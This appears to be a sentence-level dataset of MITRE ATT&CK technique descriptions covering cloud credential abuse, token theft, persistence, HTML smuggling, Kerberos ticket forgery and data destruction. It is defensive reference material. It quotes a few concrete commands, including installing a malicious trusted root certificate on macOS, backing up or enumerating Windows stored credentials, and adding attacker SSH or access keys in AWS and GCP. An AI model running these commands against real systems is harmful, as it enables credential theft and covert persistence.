    "Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as \"Connect-AZAccount\" for Azure PowerShell, \"Connect-MgGraph\" for Microsoft Graph PowerShell, and \"gcloud auth login\" for the Google Cloud CLI.",
    "In some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password.",
    "Adversaries may use port knocking to hide open ports used for persistence or command and control.",
    "To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports.",
    "After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.",
    "This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.",
    "The observation of the signal packets to trigger the communication can be conducted through different methods.",
    "One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question.",
    "Another method uses raw sockets, which enables the malware to use ports that are already open for use by other programs.",
    "Adversaries may register for web services\u00a0that can be used during targeting.",
    "A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566).",

    "Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.",
    "Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).",
    "OAuth is one commonly implemented framework that issues tokens to users for access to systems.",
    "Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.",
    "In Kubernetes environments, processes running inside a container communicate with the Kubernetes API server using service account tokens.",
    "If a container is compromised, an attacker may be able to steal the container\u2019s token and thereby gain access to Kubernetes API commands.",
    "Token theft can also occur through social engineering, in which case user action may be required to grant access.",
    "An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols.",
    "An example commonly-used sequence is Microsoft's Authorization Code Grant flow.",
    "An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials.",
    " ",
    "Adversaries can use OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.",
    "The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.",
    "Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) to the target user to entice them to grant access to the application.",

    "All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry.",
    "In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file.",
    "The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate.",
    "Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
    "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.",
    "For example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.",
    "These credentials include both x509 keys and passwords.",
    "With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.",
    "In infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the \"CreateKeyPair\" or \"ImportKeyPair\" API in AWS or the \"gcloud compute os-login ssh-keys add\" command in GCP.",
    "This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.",
    "Adversaries may also use the \"CreateAccessKey\" API in AWS or the \"gcloud iam service-accounts keys create\" command in GCP to add access keys to an account.",
    "If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).",
    "In AWS environments, adversaries with the appropriate permissions may also use the \"sts:GetFederationToken\" API call to create a temporary set of credentials tied to the permissions of the original user account.",

    "For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction.",
    "Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).",
    "An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems.",

    "Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).",
    "Adversaries may develop exploits that can be used during targeting.",
    "An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software.",

    "As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.",
    "As with legitimate development efforts, different skill sets may be required for developing exploits.",
    "The skills needed may be located in-house, or may need to be contracted out.",
    "Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.",

    "Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence.",
    "Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed.",
    "When that system component is executed through normal system operation the adversary's code will be executed instead.",
    "An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",

    "Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques.",
    "While this technique employs similar methods to [Brute Force](https://attack.mitre.org/techniques/T1110), its goal is the identification of content and infrastructure rather than the discovery of valid credentials.",
    "Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software.",

    "For example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website\u2019s pages and directories.",
    "This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [Brute Force](https://attack.mitre.org/techniques/T1110)).",
    " As cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.",
    "Once storage objects are discovered, adversaries may use [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530) to access valuable information that can be exfiltrated or used to escalate privileges and move laterally.",
    "Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders\u2019 awareness of malicious activity.",
    "Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system.",
    "Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.",
    "Rather than or in addition to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)).",
    "An adversary can also present a \u201chealthy\u201d system status even after infection.",
    "This can be abused to enable further malicious activity by delaying defender responses.",
    "For example, adversaries may show a fake Windows Security GUI and tray icon with a \u201chealthy\u201d system status after Windows Defender and other system tools have been disabled.",
    "Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system.",

    "Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.",
    "Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.",
    "Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private.",
    "Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key.",
    "This ensures that only the intended recipient can read the encrypted data.",
    "Common public key encryption algorithms include RSA and ElGamal.",
    "For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key.",
    "As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).",
    "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel.",
    "Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.",

    "Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.",
    "Adversaries may transfer tools or other files between systems in a compromised environment.",
    "Once brought into the victim environment (i.e. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.",
    "Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).",
    "Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095).",
    "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references.",
    "Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.",
    "Service paths  and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., \"C:\\unsafe path with space\\program.exe\" vs. \"\"C:\\safe path with space\\program.exe\"\").  (stored in Windows Registry keys)",
    "An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable.",
    "For example, if the path in a shortcut is \"C:\\program files\\myapp.exe\", an adversary may create a program at \"C:\\program.exe\" that will be run instead of the intended program.",
    "  This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
    "Adversaries may install SSL/TLS certificates that can be used during targeting.",
    "SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems.",
    "Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct.",
    "If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner.",
    "Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.",
    "Adversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or lending credibility to a credential harvesting site.",

    "Adversaries may use startup items automatically executed at boot initialization to establish persistence.",
    "Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.",
    "This is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, \"/Library/StartupItems\" isn\u2019t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra.",
    "A startup item is a directory whose executable and configuration property list (plist), \"StartupParameters.plist\", reside in the top-level directory.",
    "An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.",
    "Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.",
    "Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host.",
    "This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions.",
    "This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.",
    "There are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts.",
    "Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Query Registry](https://attack.mitre.org/techniques/T1012) and calls to [Native API](https://attack.mitre.org/techniques/T1106) functions.",
    "For example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language\" or parsing the outputs of Windows API functions \"GetUserDefaultUILanguage\", \"GetSystemDefaultUILanguage\", \"GetKeyboardLayoutList\" and \"GetUserDefaultLangID\".",
    "On a macOS or Linux system, adversaries may query \"locale\" to retrieve the value of the \"$LANG\" environment variable.",
    "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network.",
    "The list of possible protocols is extensive.",
    "Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).",
    "ICMP communication between hosts is one example.",
    "Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.",
    "However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
    "Adversaries may use steganography techniques in order to prevent the detection of hidden information.",
    "Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.",
    "[Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography.",
    "It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.",
    "By the end of 2017, a threat group used\u202f\"Invoke-PSImage\"\u202fto hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system.",
    "In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.",
    "Adversaries may compromise third-party DNS servers that can be used during targeting.",
    "During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)).",
    "Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.",
    "By compromising DNS servers, adversaries can alter DNS records.",
    "Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.",
    "Additionally, adversaries may use such control in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004) to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications.",
    "Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.",
    "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts.",
    "By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.",
    " Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.",
    "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.",
    "The Registry contains a significant amount of information about the operating system, configuration, software, and security.",
    "Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist.",
    "Some of the information may help adversaries to further their operation within a network.",
    "Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds.",
    "This approach may be used to avoid triggering network data transfer threshold alerts.",
    "Adversaries can use stolen session cookies to authenticate to web applications and services.",
    "This technique bypasses some multi-factor authentication protocols since the session is already authenticated.",
    "Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently.",
    "Cookies are often valid for an extended period of time, even if the web application is not actively used.",
    "After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active.",

    "Domain accounts can cover users, administrators, and services.",
    "Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.",
    "Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility.",
    "Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies.",
    "Both are binaries that may be digitally signed by Microsoft.",
    "  ",

    "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.",
    "Root certificates are used in public key cryptography to identify a root certificate authority (CA).",
    "When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.",
    "Certificates are commonly used for establishing secure TLS/SSL communications within a web browser.",
    "When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk.",
    "Depending on the security settings, the browser may not allow the user to establish a connection to the website.",
    "Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system.",
    "Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.",
    "Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.",
    "Root certificates (and their associated chains) can also be cloned and reinstalled.",
    "Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.",
    "In macOS, the Ay MaMi malware uses \"/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert\" to install a malicious certificate as a trusted root certificate into the system keychain.",
    "Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence.",
    "Network logon scripts can be assigned using Active Directory or Group Policy Objects.",
    "These logon scripts run with the privileges of the user they are assigned to.",
    "Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.",

    "Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.",
    "An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service.",
    "Adversaries can target various layers of the application stack that is hosted on the system used to provide the service.",
    "These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them.",
    "Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components.",
    "A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).",
    "To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.",
    "Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection.",
    "This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.",
    "Botnets are commonly used to conduct DDoS attacks against networks and services.",
    "Large botnets can generate a significant amount of traffic from systems spread across the global internet.",
    "Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack.",
    "In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources.",
    "In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult.",
    "Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.",
    "In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume.",
    "This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.",

    "Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.",
    "    Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.",
    "Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.",
    "To change the operating system in storage, the adversary will typically use the standard procedures available to device operators.",
    "This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.",
    "The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.",
    "To change the operating system in memory, the adversary typically can use one of two methods.",
    "In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.",
    "This method typically requires administrative level access to the device.",
    "In the second method for changing the operating system in memory, the adversary would make use of the boot loader.",
    "The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.",
    "Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) method, to directly manipulate running operating system code in memory.",
    "This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.",
    "By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before.",
    "Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600), authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004), and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).",
    "Adding new capabilities for the adversary\u2019s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001), [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port Knocking](https://attack.mitre.org/techniques/T1205/001).",
    "Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.  When this method is used in conjunction with [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.",
    "By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade.",
    "When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005).",
    "When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.",
    "However, live memory modification of the operating system can be combined with [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) to achieve persistence.",
    "Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.",
    "Kerberos TGS tickets are also known as service tickets.",
    "Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.",
    "Password hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).",
    "Adversaries may use information repositories to mine valuable information.",
    "Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.",
    "Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization.",
    "The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository: * Policies, procedures, and standards * Physical / logical network diagrams * System architecture diagrams * Technical system documentation * Testing / development credentials * Work / project schedules * Source code snippets * Links to network shares and other internal resources",
    "Information stored in a repository may vary based on the specific instance or environment.",
    "Specific common information repositories include web-based platforms such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) and [Confluence](https://attack.mitre.org/techniques/T1213/001), specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.",
    "Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity.",
    "This may involve various actions, such as removing services, deleting executables, [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File Modification](https://attack.mitre.org/techniques/T1647), or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.",
    "Adversaries may also delete accounts previously created to maintain persistence (i.e. [Create Account](https://attack.mitre.org/techniques/T1136)).",
    "In some instances, artifacts of persistence may also be removed once an adversary\u2019s persistence is executed in order to prevent errors with the new instance of the malware.",
    "Adversaries may acquire credentials from the Windows Credential Manager.",
    "The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).",
    "The Windows Credential Manager separates website credentials from application or network credentials in two lockers.",
    "As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker.",
    "Application and network credentials are stored in the Windows Credentials locker.",
    "Credential Lockers store credentials in encrypted \".vcrd\" files, located under \"%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\\".",
    "The encryption key can be found in a file named \"Policy.vpol\", typically located in the same folder as the credentials.",
    "Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms.",
    "\"vaultcmd.exe\" is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface.",
    "Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers.",
    "Windows APIs, such as \"CredEnumerateA\", may also be absued to list credentials managed by the Credential Manager.",
    "Adversaries may also obtain credentials from credential backups.",
    "Credential backups and restorations may be performed by running \"rundll32.exe keymgr.dll KRShowKeyMgr\" then selecting the \u201cBack up...\u201d button on the \u201cStored User Names and Passwords\u201d GUI.",
    "Password recovery tools may also obtain plain text passwords from the Credential Manager.",
    "Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access.",
    "Rather than just connecting and distributing payloads via removable storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.",
    "While public references of usage by threat actors are scarce, many red teams/penetration testers use hardware additions for initial access.",
    "Commercial and open source products can be used with capabilities such as passive network tapping, network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.",
    "Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems.",
    "Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application.",
    "Adversaries may install malicious components to extend and abuse server applications.",
    "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources.",
    "Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.",
    "Common operating system file deletion commands such as \"del\" and \"rm\" often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology.",
    "This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.",
    "Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.",
    "In some cases politically oriented image files have been used to overwrite data.",
    "To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by using additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).. In cloud environments, adversaries may use access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.",
    "Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect.",
    "Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications.",
    "Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.",
    " ",
    "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.",
    "Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user\u2019s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)).",
    "Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system.",
    "Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller).",
    "Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.",
    "Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.",
    "A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider.",
    "Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.",
    "Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.",
    "Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files.",
    "HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects.",
    "Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents.",
    "HTML5 also introduced a download attribute that may be used to initiate file downloads.",
    "Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes.",
    "Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as \"text/plain\" and/or \"text/html\".",
    "Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters.",
    "For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as \"msSaveBlob\".",
    "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems.",
    "The \"AllowReversiblePasswordEncryption\" property specifies whether reversible password encryption for an account is enabled or disabled.",
    "By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.",
    "If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled.",
